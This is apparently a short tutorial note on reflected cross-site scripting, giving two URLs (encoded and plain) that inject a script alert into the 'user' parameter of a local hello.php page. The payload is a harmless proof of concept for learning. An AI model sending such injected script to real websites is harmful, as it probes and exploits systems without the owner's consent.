# Reflected XSS - Example 2
Reference: https://brutelogic.com.br/blog/xss101/

`http://localhost:8000/hello.php?user=%3Cscript%3Ealert(%27XSS%27);%3C/script%3E`

`http://localhost:8000/hello.php?user=<script>alert('XSS');</script>`
